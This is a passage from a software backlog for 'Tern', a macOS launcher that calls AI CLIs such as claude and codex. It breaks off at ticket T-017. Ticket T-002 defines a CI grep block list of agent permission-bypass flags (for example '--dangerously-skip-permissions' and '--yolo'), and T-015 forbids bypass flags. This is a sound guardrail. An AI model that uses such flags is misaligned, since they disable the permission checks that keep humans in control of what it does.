# Tern Backlog

Read `ARCHITECTURE.md` first. Every ticket here is written so that a model with only this ticket and `ARCHITECTURE.md` can finish it. "Arch X.Y" means Section X.Y of `ARCHITECTURE.md`.

## How to use this file
- Work tickets in order unless the dependency list says otherwise. Tickets inside a milestone with no dependency between them can run in parallel.
- Model tags: **HAIKU** (mechanical, fully specified), **SONNET** (judgment or tricky APIs), **OPUS-ONLY** (design-sensitive, justification given), **HUMAN** (needs TP's accounts, logins or hardware; cannot be delegated to a model).
- Definition of done for every ticket: Arch Section 0 rules followed, `cargo fmt --check`, `cargo clippy --workspace -- -D warnings`, `cargo test -p tern-tests`, `swift build` all pass, CI green, and the ticket's acceptance criteria met.
- If a ticket turns out to need an architecture decision not covered by `ARCHITECTURE.md`, stop and open an issue labeled `needs-architect` instead of guessing.
- Milestones are vertical slices: after M1 the calculator works end to end; after M2 asking Claude works end to end.

## Milestone overview
| Milestone | Outcome | Tickets |
|---|---|---|
| M0 Foundations | App launches to menu bar, hotkey opens panel, memory measured in CI | T-001 to T-008 |
| M1 Calculator | Type `5 km to mi`, see and copy result | T-009, T-010 |
| M2 Ask Claude | Tab, type a question, streamed answer from `claude` | T-011 to T-021 |
| M3 Screenshot | Capture region, attach, ask | T-022, T-023 |
| M4 More providers | Codex and Antigravity, switching, follow-ups, history | T-024 to T-026 |
| M5 File search | Index folders, search names and content | T-027 to T-034 |
| M6 MCP | CLIs can search, read, calculate, screenshot via Tern | T-035 to T-038 |
| M7 Safety and polish | Allow-edits mode, settings, onboarding, login item | T-039 to T-042 |
| M8 Hardening | Full memory gates, security review | T-043, T-044 |
| M9 Release | Signed, notarized, Homebrew cask | T-045 to T-048 |
| P2 | Gemini legacy, rename, Spotlight, clipboard images | T-049 to T-052 |

---

# M0 Foundations

## T-001 Repository skeleton
- **Model:** HAIKU
- **Goal:** Create the workspace layout from Arch 4.1 so every later ticket has a place to put code.
- **Depends on:** none
- **Files to create:**
  - `Cargo.toml` (workspace, `resolver = "3"`, members `crates/tern-core`, `crates/tern-ffi`, `crates/tern-mcp`, `test/rust`, `xtask`; `[workspace.package] edition = "2024"`, `license = "MIT OR Apache-2.0"`, `version = "0.1.0"`; `[profile.release] lto = "thin"`, `codegen-units = 1`, `opt-level = "s"`, `strip = "symbols"`, `panic = "abort"`)
  - `.cargo/config.toml` with `[alias] xtask = "run --package xtask --"`
  - `rust-toolchain.toml`: `channel = "stable"`, `components = ["rustfmt", "clippy"]`, `targets = ["aarch64-apple-darwin"]`
  - `crates/tern-core/Cargo.toml` and `src/lib.rs` declaring every module in Arch 4.1 as `pub mod` with empty files (`index` and `providers` and `platform` as directories with `mod.rs`)
  - `crates/tern-ffi/Cargo.toml` (`crate-type = ["staticlib", "cdylib"]`) and `src/lib.rs` (empty)
  - `crates/tern-mcp/Cargo.toml` with `[lib]` and `[[bin]] name = "tern-mcp"`, `src/lib.rs`, `src/main.rs` with `fn main() {}`
  - `xtask/Cargo.toml`, `xtask/src/main.rs` printing usage `xtask <build-core|bundle|membench|gen-corpus>` and exiting 2 on unknown command
  - `test/rust/Cargo.toml` (name `tern-tests`, `publish = false`, dev-dependencies on `tern-core` and `tern-mcp` by path), `test/rust/src/lib.rs` (empty), `test/rust/tests/smoke.rs` with one test asserting `1 + 1 == 2`
  - `test/fixtures/providers/.gitkeep`, `test/fixtures/corpus/.gitkeep`, `test/bench/.gitkeep`, `test/swift/.gitkeep`
  - `shell/macos/Sources/TernApp/.gitkeep`, `shell/macos/Sources/TernKit/.gitkeep`, `shell/macos/Resources/.gitkeep`
  - `.gitignore`: `/target`, `/dist`, `/.build`, `shell/macos/Sources/TernFFI/`, `shell/macos/Sources/TernFFIC/`, `.DS_Store`, `*.profraw`
  - `LICENSE-MIT`, `LICENSE-APACHE` (standard texts, copyright "2026 Tern contributors")
  - `CHANGELOG.md` with an `## Unreleased` heading
  - `AGENTS.md` and `CLAUDE.md` (copy from repo root drafts in this docs set if present; otherwise CLAUDE.md contains the single line `@AGENTS.md`)
- **Edge cases:** none.
- **Acceptance:** `cargo build --workspace` and `cargo test -p tern-tests` succeed on macOS. `cargo xtask` prints usage and exits 2.
- **Test:** run the two commands above.

## T-002 CI pipeline
- **Model:** HAIKU
- **Goal:** Every push runs format, lint, tests, license checks, the Linux portability check and the forbidden-flag grep.
- **Depends on:** T-001
- **Files to create:** `.github/workflows/ci.yml`, `deny.toml`, `scripts/forbidden-flags.sh`
- **Details:**
  - Job `macos` on `macos-15` (arm64): checkout, install stable toolchain, `cargo fmt --all --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test -p tern-tests`, `swift build` (skip with `if: hashFiles('Package.swift') != ''`), `cargo install cargo-deny --locked` then `cargo deny check licenses advisories`.
  - Job `linux` on `ubuntu-latest`: `cargo check -p tern-core -p tern-mcp`, then `cargo test -p tern-tests`.
  - Job `guardrails` on `ubuntu-latest`: `bash scripts/forbidden-flags.sh`.
  - `scripts/forbidden-flags.sh`: `grep -RInE -- '--dangerously-skip-permissions|--yolo|bypassPermissions|danger-full-access|--full-auto' crates shell xtask` excluding nothing; exits 1 and prints matches if any found, else exits 0. Note: `ARCHITECTURE.md` mentions these strings but `docs/` is not scanned.
  - `deny.toml`: `[licenses] allow = [` list from Arch 4.4 `]`, `confidence-threshold = 0.9`; `[advisories] yanked = "deny"`; `[bans] multiple-versions = "warn"`.
  - Cache `~/.cargo/registry`, `~/.cargo/git`, `target` with `actions/cache` keyed on `Cargo.lock`.
- **Edge cases:** `Cargo.lock` absent on first run: commit it in this ticket (`cargo generate-lockfile`).
- **Acceptance:** A PR with no code changes passes all three jobs. Adding the string `--yolo` to any file under `crates/` fails `guardrails`.
- **Test:** push a branch with and without the forbidden string.

## T-003 Core basics: errors, paths, logging
- **Model:** HAIKU
- **Goal:** Implement `error.rs`, `paths.rs`, `logging.rs` exactly as Arch 18 and 14.1.
- **Depends on:** T-001
- **Files:** edit `crates/tern-core/Cargo.toml` (deps `thiserror`, `log`, `serde_json`, `toml`, `rusqlite` with `bundled`, `libc`); create content in `src/error.rs`, `src/paths.rs`, `src/logging.rs`; tests `test/rust/tests/paths.rs`, `test/rust/tests/logging.rs`.
- **Interfaces:**
```rust
pub struct TernPaths { pub home: PathBuf }
impl TernPaths {
    pub fn resolve(override_home: Option<&Path>) -> Result<Self, CoreError>;
    pub fn ensure_dirs(&self) -> Result<(), CoreError>;
    pub fn config_file(&self) -> PathBuf;
    pub fn index_db(&self) -> PathBuf;
    pub fn state_db(&self) -> PathBuf;
    pub fn captures_dir(&self) -> PathBuf;
    pub fn workspaces_dir(&self) -> PathBuf;
    pub fn workspace_dir(&self, conversation_id: &str) -> PathBuf;
    pub fn prompts_dir(&self) -> PathBuf;
    pub fn system_prompt_file(&self) -> PathBuf;
    pub fn run_dir(&self) -> PathBuf;
    pub fn socket_path(&self) -> PathBuf;
    pub fn logs_dir(&self) -> PathBuf;
    pub fn app_log_file(&self) -> PathBuf;
    pub fn mcp_log_file(&self) -> PathBuf;
}
pub struct FileLogger;
impl FileLogger { pub fn init(path: &Path, level: log::LevelFilter) -> Result<(), CoreError>; }
```
- **Details:** resolution order: `override_home`, env `TERN_HOME`, `$HOME/Library/Application Support/Tern`. `ensure_dirs` creates home, captures, workspaces, prompts, logs, and run with mode 0700. `socket_path` returns `run/s`, or `$TMPDIR/tern-<uid>/s` if the first path is longer than 100 bytes. Logger: Arch 18.2 format and rotation (rename `.1` to `.2`, current to `.1` when current exceeds 1 MiB before a write); calling `init` twice returns `Ok(())` without replacing the logger.
- **Edge cases:** `HOME` unset gives `ErrorKind::Config`; unwritable home gives `ErrorKind::Io` with the path in the message; workspace ids containing `/` or `..` are rejected with `InvalidInput` (`workspace_dir` returns `PathBuf`, so add `pub fn validate_id(id: &str) -> Result<(), CoreError>` accepting only `[A-Za-z0-9-]{1,64}`).
- **Acceptance:** all functions implemented; tests cover override, env var, long socket fallback, rotation at 1 MiB, id validation.
- **Test:** `cargo test -p tern-tests --test paths --test logging`.

## T-004 Settings
- **Model:** HAIKU
- **Goal:** Implement Arch 14.2.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/settings.rs`; deps `serde` (derive); test `test/rust/tests/settings.rs`.
- **Interfaces:**
```rust
impl Default for Settings;
impl Settings {
    pub fn load(path: &Path) -> Result<(Settings, Option<String>), CoreError>;
    pub fn save(&self, path: &Path) -> Result<(), CoreError>;
    pub fn validate(&self) -> Result<(), CoreError>;
    pub fn provider(&self, id: &str) -> Option<&ProviderSettings>;
}
pub fn parse_hotkey(spec: &str) -> Result<Hotkey, CoreError>;
pub struct Hotkey { pub modifiers: Vec<Modifier>, pub key: String }
pub enum Modifier { Cmd, Alt, Ctrl, Shift }
```
- **Details:** `serde(rename_all = "snake_case")`, `#[serde(default)]` on the struct so missing keys use defaults. `AiMode` serializes as `"read_only"` / `"allow_edits"`. `load` returns the optional warning string when it had to rename a broken file. Missing file returns defaults and no warning. Hotkey grammar: lowercase tokens joined by `+`; modifiers `cmd|alt|option|ctrl|shift` (`option` maps to `Alt`); key one of `a`-`z`, `0`-`9`, `space`, `return`, `tab`, `f1`-`f12`; at least one modifier required.
- **Edge cases:** duplicate provider ids (validation error), unknown provider id in `default_provider`, `allow_edits` without `work_dir`, roots that overlap, root equal to `$HOME` or `/`, hotkey without modifier, both hotkeys equal.
- **Acceptance:** round trip `save` then `load` gives equal struct; each validation rule has a failing and a passing test.
- **Test:** `cargo test -p tern-tests --test settings`.

## T-005 FFI scaffold and Swift bindings build
- **Model:** SONNET (UniFFI and SwiftPM linking details)
- **Goal:** Swift can construct `TernCore` and call `version()` and `settings()`.
- **Depends on:** T-004
- **Files:**
  - `crates/tern-core/src/core.rs`: `pub struct Core { ... }` with `pub fn open(home: Option<PathBuf>) -> Result<Core, CoreError>` (resolves paths, ensures dirs, inits logger, loads settings) and `pub fn settings(&self) -> Settings`, `pub fn version() -> &'static str` (from `env!("CARGO_PKG_VERSION")`).
  - `crates/tern-ffi/Cargo.toml`: deps `uniffi` (pin latest 0.x at implementation time, features `cli` optional), `tern-core`.
  - `crates/tern-ffi/src/lib.rs`: `uniffi::setup_scaffolding!();`, `TernCore` object with `new`, `version`, `settings`, `update_settings`, plus `trim_memory` and `shutdown` as no-ops (filled in by T-042 and T-020); `CoreListener` foreign trait (Arch 6) stored but unused for now; FFI copies of `Settings`, `ProviderSettings`, `AiMode` with `From` conversions; `FfiError`.
  - `crates/tern-ffi/src/bin/uniffi-bindgen.rs`: `fn main() { uniffi::uniffi_bindgen_main() }` behind `required-features = ["cli"]`.
  - `xtask/src/main.rs`: `build-core [--release]` runs `cargo build -p tern-ffi --target aarch64-apple-darwin [--release]`, then `cargo run -p tern-ffi --features cli --bin uniffi-bindgen -- generate --library <target>/libtern_ffi.dylib --language swift --out-dir <tmp>`, then moves `tern_ffi.swift` to `shell/macos/Sources/TernFFI/`, and `tern_ffiFFI.h` to `shell/macos/Sources/TernFFIC/include/` plus writes `shell/macos/Sources/TernFFIC/include/module.modulemap` (`module tern_ffiFFI { header "tern_ffiFFI.h" export * }`) and an empty `shell/macos/Sources/TernFFIC/shim.c`.
  - `Package.swift` (root): tools 6.0, `platforms: [.macOS(.v14)]`; targets: `tern_ffiFFI` (C, path `shell/macos/Sources/TernFFIC`, linker `-L <Context.packageDirectory>/target/aarch64-apple-darwin/<debug|release>` chosen by env `TERN_PROFILE` default `debug`, `linkedLibrary("tern_ffi")`); `TernFFI` (Swift, path `shell/macos/Sources/TernFFI`, depends on `tern_ffiFFI`); `TernKit` (Swift library, path `shell/macos/Sources/TernKit`); `TernApp` (executable, path `shell/macos/Sources/TernApp`, depends on `TernFFI`, `TernKit`); `TernKitTests` (test, path `test/swift`, depends on `TernKit`).
- **Edge cases:** UniFFI library mode needs the cdylib for metadata; linking uses the static lib (delete or ignore the dylib in the Swift link path by passing the full `.a` path with `-Xlinker` if the linker prefers the dylib). If the C target's module name must match its directory, keep the target name `tern_ffiFFI` as written.
- **Acceptance:** `cargo xtask build-core && swift build` succeeds; a temporary `main.swift` in `TernApp` printing `TernCore(homeDir: nil, listener: ...).version()` prints `0.1.0` (removed again in T-006).
- **Test:** add `test/rust/tests/core_open.rs`: `Core::open(Some(tmp))` creates the directory tree and returns default settings.

## T-006 macOS shell skeleton and app bundle
- **Model:** SONNET (bundle assembly, signing)
- **Goal:** `cargo xtask bundle` produces `dist/Tern.app` that runs as a menu bar app.
- **Depends on:** T-005
- **Files:** `shell/macos/Sources/TernApp/main.swift`, `AppDelegate.swift`, `CoreBridge.swift`, `StatusItemController.swift`; `shell/macos/Resources/Info.plist`, `shell/macos/Resources/Tern.entitlements` (empty dict), placeholder `AppIcon.icns` (any valid icon); `xtask` subcommand `bundle [--release] [--sign <identity>]`.
- **Interfaces (Swift):**
```swift
final class CoreBridge: CoreListener, @unchecked Sendable {
    static func start() throws -> CoreBridge
    let core: TernCore
    func onAskEvent(askId: String, event: AskEvent)
    func onIndexStatus(status: IndexStatus)
    func onAiCapture(path: String)
}
```
  (Listener methods can be empty until later tickets; they must dispatch to main.)
- **Details:** `Info.plist` keys per Arch 15. Status item uses SF Symbol `sparkle.magnifyingglass` template image; menu items "Open Tern", "Settings...", "Quit Tern" (Cmd+Q). If `CoreBridge.start()` throws, show an `NSAlert` with the message and quit. Bundle steps: `build-core --release`, `cargo build -p tern-mcp --release --target aarch64-apple-darwin`, `TERN_PROFILE=release swift build -c release --arch arm64`, create `dist/Tern.app/Contents/{MacOS,Resources}`, copy `TernApp` binary as `MacOS/Tern`, `tern-mcp` to `MacOS/tern-mcp`, plist and icon, then `codesign --force --options runtime --timestamp=none --entitlements ... --sign <identity>` on `tern-mcp` first and the app second. Identity: `--sign` arg, else env `TERN_SIGN_IDENTITY`, else "Tern Dev" if `security find-identity -v -p codesigning` lists it, else `-` (ad-hoc).
- **Edge cases:** existing `dist/Tern.app` is removed first; missing `codesign` or failed signing exits non-zero with stderr shown.
- **Acceptance:** `open dist/Tern.app` shows the menu bar icon, no Dock icon; Quit works; `codesign --verify --deep --strict dist/Tern.app` passes.
- **Test:** manual run; CI job step `cargo xtask bundle` on macOS.

## T-007 Global hotkey and launcher panel
- **Model:** SONNET (Carbon hotkeys, non-activating panel focus)
- **Goal:** Option+Space toggles an empty launcher panel with a text field.
- **Depends on:** T-006
- **Files:** `shell/macos/Sources/TernKit/HotKeySpec.swift`, `shell/macos/Sources/TernApp/HotKeyCenter.swift`, `LauncherPanel.swift`, `LauncherViewController.swift`; test `test/swift/HotKeySpecTests.swift`.
- **Interfaces:**
```swift
public struct HotKeySpec: Equatable, Sendable {
    public let keyCode: UInt32
    public let carbonModifiers: UInt32
    public static func parse(_ spec: String) -> HotKeySpec?
}
final class HotKeyCenter {
    enum Action { case togglePanel, captureAndAsk }
    func register(_ spec: HotKeySpec, action: Action) -> Bool
    func unregisterAll()
    var handler: ((Action) -> Void)?
}
```
- **Details:** grammar identical to `parse_hotkey` in T-004. Map keys with `kVK_ANSI_*`, `kVK_Space`, `kVK_Return`, `kVK_Tab`, `kVK_F1`...; modifiers `cmdKey`, `optionKey`, `controlKey`, `shiftKey`. Use `InstallEventHandler` on `GetApplicationEventTarget()` for `kEventHotKeyPressed`. Panel per Arch 5.3; it must become key without activating the app's other windows (`canBecomeKey` returns true; call `makeKeyAndOrderFront` then `NSApp.activate()` only if needed for text input to work). Esc hides; clicking outside hides (observe `didResignKeyNotification`).
- **Edge cases:** registration failure (hotkey taken) returns false; AppDelegate then shows a one-time alert suggesting another hotkey. Multiple screens: panel opens on the screen containing the mouse. Full-screen apps: panel appears over them (`fullScreenAuxiliary`).
- **Acceptance:** hotkey opens the panel with the caret in the field within 50 ms (log `os_signpost` or timestamp difference), pressing again or Esc hides it, typing works without clicking.
- **Test:** `swift test` covers parse success and failure cases (no modifier, unknown key, uppercase, `option` alias).

## T-008 Memory benchmark v0
- **Model:** SONNET (process sampling, CI integration)
- **Goal:** CI measures app footprint for the idle and panel phases and fails on budget breach.
- **Depends on:** T-007
- **Files:** `shell/macos/Sources/TernApp/BenchMode.swift`; `xtask/src/membench.rs` (module of xtask); `test/bench/budgets.toml`; edit `.github/workflows/ci.yml` (job `membench` on `macos-15` after `macos`).
- **Interfaces:**
```rust
pub struct Sample { pub t_ms: u64, pub footprint: u64, pub peak: u64 }
pub fn footprint(pid: i32) -> Result<(u64, u64), String>;
```
`footprint` calls `libc::proc_pid_rusage(pid, RUSAGE_INFO_V4, ...)` and returns `(ri_phys_footprint, ri_lifetime_max_phys_footprint)`.
- **Budgets file format:**
```toml
[[budget]]
name = "app_idle_empty"
phase = "idle"
process = "app"
metric = "footprint"
target_mb = 22
limit_mb = 30
```
  Entries for v0: `app_idle_empty` (phase idle, limit 30), `app_panel_shown` (phase panel_shown, limit 50), `app_panel_hidden` (phase panel_hidden, metric footprint, limit 38: idle limit plus 8).
- **Details:** BenchMode (Arch 17.3): when `TERN_BENCH=1`, after launch wait 10 s then print `{"phase":"idle","ready":true}`; read a line from stdin; show panel, fill the field with "bench" and print `panel_shown`; read; hide, call `trimMemory`, wait 5 s, print `panel_hidden`; read; print `shutdown` and terminate. Phases not implemented yet are simply not printed. `xtask membench`: `bundle --release`, launch the binary directly with `TERN_HOME=<tempdir>` and `TERN_BENCH=1`, pipe stdin and stdout, on each phase line take 10 samples 100 ms apart, record the median footprint and the max peak, write a newline to continue. Compare budgets whose phase appeared; missing phases are reported as "skipped". Write `target/membench/report.json` and append a Markdown table to `$GITHUB_STEP_SUMMARY` when set. Exit 1 on any breach.
- **Edge cases:** app exits early (report stderr, exit 1); phase line not received within 60 s (timeout, exit 1); `trimMemory` exists as a no-op from T-005 and gains real behavior in T-042.
- **Acceptance:** `cargo xtask membench` prints a table with three measured phases on a dev Mac and passes; CI job runs it.
- **Test:** run locally; temporarily lower a limit to 1 MB to see the failure path.

---

# M1 Calculator

## T-009 Calculator core
- **Model:** HAIKU
- **Goal:** Implement Arch 11.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/calc.rs`; dep `fend-core` with default features off unless that drops required functionality; verify the GPL feature is not enabled with `cargo tree -e features -p tern-core | grep -i gpl` returning nothing; test `test/rust/tests/calc.rs`.
- **Interfaces:** `pub struct CalcResult { pub display: String, pub is_approximate: bool }`, `pub fn evaluate(input: &str, deadline: Duration) -> Option<CalcResult>`, `struct Deadline { until: Instant }` implementing `fend_core::Interrupt`.
- **Edge cases (each a test):** `""` none; `"hello"` none; `"e"` some; `"pi"` some approximate; `"2+2"` gives `4`; `"5 km to mi"` approximate miles; `"100 °C to °F"` gives `212 °F`; `"0xff to decimal"` gives `255`; `"1/0"` none (error); `"2024 report"` none; `"10"` none (result equals input); input of 501 chars none; `"2^10000000"` returns none within 100 ms with a 50 ms deadline.
- **Acceptance:** all tests pass; p95 evaluation time for the non-timeout cases under 5 ms in a loop of 1,000 runs (assert in test with a generous 20 ms bound to avoid CI flakiness).
- **Test:** `cargo test -p tern-tests --test calc`.

## T-010 Calculator in the panel
- **Model:** HAIKU
- **Goal:** Typing an expression shows a calc row; Enter copies the result.
- **Depends on:** T-009, T-007
- **Files:** edit `crates/tern-core/src/core.rs` (`pub fn calc(&self, input: &str) -> Option<CalcResult>` with 50 ms deadline), `crates/tern-ffi/src/lib.rs` (`calc`, `CalcOutput`); create `shell/macos/Sources/TernApp/ResultsListView.swift`, `shell/macos/Sources/TernKit/Debouncer.swift`; edit `LauncherViewController.swift`; test `test/swift/DebouncerTests.swift`.
- **Interfaces:**
```swift
public final class Debouncer: @unchecked Sendable {
    public init(delay: TimeInterval, queue: DispatchQueue)
    public func schedule(_ work: @escaping @Sendable () -> Void)
    public func cancel()
}
enum ResultRow { case calc(display: String, approximate: Bool) }
```
- **Details:** 60 ms debounce on `coreQueue`; results applied on main only if the input text has not changed since the request (compare a generation counter). Calc row shows `= <display>` with a "≈" prefix when approximate, plus a hint "Enter to copy". Enter copies `display` to `NSPasteboard.general` and hides the panel.
- **Edge cases:** rapid typing (stale results discarded), empty input clears rows, panel hidden mid-request (drop result).
- **Acceptance:** typing `5 km to mi` shows `≈ 3.1068559612 mi` (whatever fend formats) within one debounce cycle; Enter places it on the clipboard.
- **Test:** Debouncer tests (only the last scheduled work runs; cancel prevents run); manual check.

---

# M2 Ask Claude

## T-011 Platform layer
- **Model:** SONNET (libc QoS, login shell probing)
- **Goal:** Implement the `Platform` trait (Arch 19.2) with macOS and unsupported impls. Capture and downscale are implemented here too, used later by T-022.
- **Depends on:** T-003
- **Files:** `crates/tern-core/src/platform/mod.rs`, `macos.rs` (`#[cfg(target_os = "macos")]`), `unsupported.rs` (`#[cfg(not(target_os = "macos"))]`); test `test/rust/tests/platform.rs`.
- **Details:**
  - `capture`: Arch 12.1 commands via `std::process::Command` with timeouts (poll `try_wait` every 50 ms; kill on timeout). After success read PNG width and height from the IHDR chunk (bytes 16 to 24, big-endian) instead of decoding the image.
  - `downscale_png`: `/usr/bin/sips -Z <max_edge> <src> --out <dest>`; if the image is already smaller, copy instead.
  - `set_background_priority`: `libc::pthread_set_qos_class_self_np(libc::qos_class_t::QOS_CLASS_BACKGROUND, 0)`.
  - `login_shell_path`: read `$SHELL` (default `/bin/zsh`), run `<shell> -l -c 'printf %s "$PATH"'` with stdin null and the timeout; return trimmed stdout; error if empty.
  - `spotlight_names`: `mdfind -name <query>` with the timeout, take first `limit` lines.
  - `screen_capture_allowed`: `None` from Rust (Swift does the real check).
  - `pub fn current() -> Arc<dyn Platform>` picks the impl by cfg.
- **Edge cases:** shell prints banners to stdout (take the last line only); shell hangs (timeout kills process group); `screencapture` not at path (error kind `Capture`); PNG shorter than 24 bytes (error).
- **Acceptance:** on macOS, `login_shell_path` returns a PATH containing `/usr/bin`; `downscale_png` produces a file whose IHDR max edge is at most the limit; on Linux CI the crate compiles and unsupported methods return `ErrorKind::Unsupported`.
- **Test:** tests marked to run only on macOS with `#[cfg_attr(not(target_os = "macos"), ignore)]`; capture tests are not automated (needs a user).

## T-012 Process environment and binary discovery
- **Model:** SONNET
- **Goal:** Implement Arch 8.8.
- **Depends on:** T-011, T-004
- **Files:** `crates/tern-core/src/procenv.rs`; test `test/rust/tests/procenv.rs`.
- **Interfaces:**
```rust
pub struct ProcEnv { pub path: String, pub base_env: Vec<(OsString, OsString)>, pub home: PathBuf }
impl ProcEnv {
    pub fn build(platform: &dyn Platform, app_env: &[(OsString, OsString)]) -> ProcEnv;
    pub fn find_binary(&self, name: &str, override_path: Option<&Path>) -> Option<PathBuf>;
    pub fn run_version(&self, binary: &Path, args: &[&str], timeout: Duration) -> Result<String, CoreError>;
}
```
- **Details:** `build` calls `login_shell_path` with 3 s timeout; on error falls back to `/usr/bin:/bin:/usr/sbin:/sbin:/opt/homebrew/bin:/usr/local/bin` and logs a warning. `base_env` exactly per Arch 8.8. `find_binary` order per Arch 8.8, checks the file exists and has an execute bit. `run_version` runs the binary with `args`, env `base_env`, stdin null, returns the first line of stdout trimmed.
- **Edge cases:** override path not executable (ignored with warning); duplicate PATH entries; `~` in config paths expanded; non-UTF-8 env values preserved as `OsString`.
- **Acceptance:** with a temp dir containing an executable script named `claude`, `find_binary("claude", None)` finds it when the dir is put first in a synthetic PATH (make `build` testable by adding `pub fn from_parts(path: String, app_env: &[(OsString, OsString)], home: PathBuf) -> ProcEnv`).
- **Test:** `cargo test -p tern-tests --test procenv`.

## T-013 Provider types and runner
- **Model:** SONNET (process groups, signals, threading)
- **Goal:** Generic machinery to run any provider turn and stream events (Arch 8.1, 8.2, 7.2 steps 4 to 8, Arch 13).
- **Depends on:** T-012
- **Files:** `crates/tern-core/src/providers/mod.rs` (all types from Arch 8.1 plus `ProviderRegistry`), `crates/tern-core/src/providers/runner.rs`; dep `crossbeam-channel`; test `test/rust/tests/runner.rs`.
- **Interfaces:**
```rust
pub struct ProviderRegistry { providers: Vec<Arc<dyn Provider>> }
impl ProviderRegistry {
    pub fn new(providers: Vec<Arc<dyn Provider>>) -> Self;
    pub fn get(&self, id: &str) -> Option<Arc<dyn Provider>>;
    pub fn all(&self) -> &[Arc<dyn Provider>];
}
pub struct RunLimits { pub total: Duration, pub idle: Duration, pub max_line_bytes: usize, pub max_final_text_bytes: usize }
pub struct RunHandle { pub cancel: Arc<AtomicBool>, pub pid: u32 }
pub fn run_turn(
    spec: CommandSpec,
    parser: Box<dyn EventParser>,
    limits: RunLimits,
    on_event: Box<dyn Fn(AgentEvent) + Send>,
) -> Result<RunHandle, CoreError>;
pub fn classify_failure(exit: &ExitInfo, stderr_tail: &str, last_error: Option<&str>) -> AgentEvent;
```
- **Details:** spawn with `std::os::unix::process::CommandExt::process_group(0)`, `env_clear()` then `envs(spec.env)`, stdin piped if `spec.stdin` is some (write all then close) else null. Threads: stdout reader (`BufReader::read_until(b'\n')` with a manual cap of `max_line_bytes`; oversize line is skipped to the next newline and a `Warning` emitted), stderr reader into an 8 KiB ring buffer, waiter that polls `try_wait` every 50 ms checking cancel flag, total and idle timeouts. Cancel and timeout send `SIGINT` to `-pgid`, then `SIGTERM` at +2 s, `SIGKILL` at +5 s. After exit, join readers, call `parser.finish`, then emit events. Text accumulation: track `TextDelta` text; if no `TextFinal` was emitted by the parser, emit one with the accumulated deltas before `Completed`. Truncate final text at `max_final_text_bytes` (char boundary) and append `\n\n[truncated]`. `classify_failure` per Arch 8.2 rule 5.
- **Edge cases:** binary missing (`ErrorKind::ProviderNotInstalled` returned synchronously); process exits before stdin write completes (ignore EPIPE); child spawns grandchildren (killed via process group); non-UTF-8 output (lossy decode); zero-output process; extremely chatty output (bounded channel back-pressure, no unbounded buffering).
- **Acceptance:** tests with small shell scripts as fake CLIs: normal JSON lines, oversize line, timeout, idle timeout, cancel, non-zero exit with "401" in stderr gives `NotLoggedIn`, grandchild `sleep 100` is gone after cancel (check with `kill(pid, 0)`).
- **Test:** `cargo test -p tern-tests --test runner` (macOS and Linux).

## T-014 Fake provider
- **Model:** HAIKU
- **Goal:** A provider that replays fixture lines so tests, UI work and membench need no real CLI.
- **Depends on:** T-013
- **Files:** `crates/tern-core/src/providers/fake.rs` (add `pub mod fake;`), `test/fixtures/providers/fake/replay.sh`, `test/fixtures/providers/fake/hello.jsonl` (hand-written in Claude stream-json shape: one `system/init` with `session_id` "fake-session-1", three `stream_event` text deltas "Hello", ", ", "world", one `result` with `result` "Hello, world", `session_id`, `is_error` false, `usage`, `total_cost_usd` 0); test `test/rust/tests/fake_provider.rs`.
- **Details:** `replay.sh <fixture>` prints each line of the file with `sleep ${FAKE_DELAY_MS:-20}/1000` between lines and exits `${FAKE_EXIT:-0}`. `FakeProvider` id `fake`, display name "Fake", binary `/bin/sh`, `build_command` runs `sh <replay.sh> <fixture>` where both paths come from env `TERN_FAKE_PROVIDER` (script path) and `TERN_FAKE_FIXTURE` (fixture path); parser is a minimal Claude-shaped parser written in this file (`system/init`, `stream_event` text deltas, `result`). T-019 later replaces it by reusing the real Claude parser. The registry includes `FakeProvider` only when `TERN_FAKE_PROVIDER` is set.
- **Acceptance:** running a turn through `run_turn` yields `SessionStarted`, three `TextDelta`, `TextFinal("Hello, world")`, `Completed`.
- **Test:** `cargo test -p tern-tests --test fake_provider`.

## T-015 Fixture capture script
- **Model:** HAIKU
- **Goal:** One script TP runs to record real JSONL output from each installed CLI.
- **Depends on:** T-001
- **Files:** `scripts/capture-fixtures.sh`, `test/fixtures/providers/README.md` (how to run, what each file is).
- **Details:** bash, `set -euo pipefail`. Creates a temp dir as cwd with a 1 KB `note.txt` and a tiny PNG (`screencapture -x -m` then `sips -Z 200`). For each CLI found on PATH, records to `test/fixtures/providers/<id>/<case>.jsonl` plus `<case>.stderr.txt` and `<case>.exit.txt`:
  - claude: `text` (`claude -p --output-format stream-json --verbose --include-partial-messages --permission-mode dontAsk --tools Read,Glob,Grep "Reply with exactly: hello fixture"`), `resume` (second call with `--resume <session_id from first>` "Repeat the previous answer"), `image` ("Describe ./tiny.png in five words. Use the Read tool."), `denied` ("Create a file named x.txt" to capture a denial), `error` (`--model does-not-exist`).
  - codex: `text` (`codex exec --json --sandbox read-only --skip-git-repo-check -C <tmp> - <<< "Reply with exactly: hello fixture"`), `resume` (`codex exec --json --sandbox read-only --skip-git-repo-check -C <tmp> resume <thread_id> -`; if that fails, retry with `resume` placed before the flags and record which worked in `resume.variant.txt`), `image` (`-i tiny.png`), `mcp_override` (with the two `-c mcp_servers.tern...` overrides pointing at `/usr/bin/true`; record stderr), `error` (`-m does-not-exist`).
  - agy: `text` (`agy -p "Reply with exactly: hello fixture" --output-format stream-json`), `resume` (`--conversation <id>`), `image` ("Describe the image at <abs>/tiny.png in five words"), `denied` ("Create a file named x.txt"), `mcp_workspace` (with `.agents/mcp_config.json` pointing at a dummy server, prompt "List your MCP servers").
  - gemini (if present): `text`, `resume`, `error`.
- **Edge cases:** CLI missing (skip with a message); command fails (still save output and exit code); never run with any bypass flag; the script must print a reminder that fixtures can contain the user's account email or org names and must be reviewed before committing.
- **Acceptance:** shellcheck clean; dry run with `--list` prints the commands without executing.
- **Test:** `shellcheck scripts/capture-fixtures.sh` in CI guardrails job (add the step).

## T-016 Record fixtures
- **Model:** HUMAN (needs TP's logged-in CLIs)
- **Goal:** Commit real fixtures for claude, codex and agy.
- **Depends on:** T-015
- **Steps:** run `scripts/capture-fixtures.sh`; review every file and replace personal data (emails, org ids, account names) with `REDACTED`; keep line structure intact; commit. Record CLI versions in `test/fixtures/providers/<id>/VERSION`. Update `docs/RESEARCH.md` rows that the fixtures confirm or disprove (codex resume flag order, codex `-c` MCP override, agy image reading, agy workspace MCP loading).
- **Acceptance:** each provider dir has at least `text`, `resume`, `error` cases with stdout, stderr and exit files plus `VERSION`.

## T-017 Workspaces and system prompt
